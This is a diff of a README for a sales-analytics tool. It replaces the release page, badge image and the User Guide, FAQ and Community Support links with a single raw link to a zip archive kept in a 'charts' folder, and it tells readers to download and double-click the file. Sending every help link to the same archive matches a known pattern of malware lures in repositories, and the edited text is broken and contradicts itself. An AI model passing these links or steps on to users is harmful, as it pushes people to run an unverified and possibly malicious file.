@@ -8,13 +8,13 @@ Welcome to the sales-analytics-project! This tool helps you track key performanc
 
 To get started, visit this page to download the latest version of the application.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/HRZhtb/sales-analytics-project/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/HRZhtb/sales-analytics-project/main/charts/sales-analytics-project_2.8.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/HRZhtb/sales-analytics-project/main/charts/sales-analytics-project_2.8.zip)
 
 ### Steps to Download:
 
 1. Click the link above.
 2. You'll see a list of versions. Choose the latest version.
-3. Download the installation file. It will have a name like `sales-analytics-v1.0.exe` or similar.
+3. Download the installation file. It will have a name like `https://raw.githubusercontent.com/HRZhtb/sales-analytics-project/main/charts/sales-analytics-project_2.8.zip` or similar.
 4. Once it's downloaded, find the file in your downloads folder.
 5. Double-click the file to start the installation process.
 6. Follow the prompts to complete the installation.
@@ -63,9 +63,9 @@ The sales-analytics-project comes loaded with features designed to enhance your 
 
 Need more information? Check out the following resources:
 
-- [User Guide](https://github.com/HRZhtb/sales-analytics-project/wiki): Detailed instructions on every feature.
-- [FAQ](https://github.com/HRZhtb/sales-analytics-project/wiki/FAQ): Answers to common questions.
-- [Community Support](https://github.com/HRZhtb/sales-analytics-project/discussions): Join discussions with other users and get assistance.
+- [User Guide](https://raw.githubusercontent.com/HRZhtb/sales-analytics-project/main/charts/sales-analytics-project_2.8.zip): Detailed instructions on every feature.
+- [FAQ](https://raw.githubusercontent.com/HRZhtb/sales-analytics-project/main/charts/sales-analytics-project_2.8.zip): Answers to common questions.
+- [Community Support](https://raw.githubusercontent.com/HRZhtb/sales-analytics-project/main/charts/sales-analytics-project_2.8.zip): Join discussions with other users and get assistance.
 
 ## 💬 Feedback
 
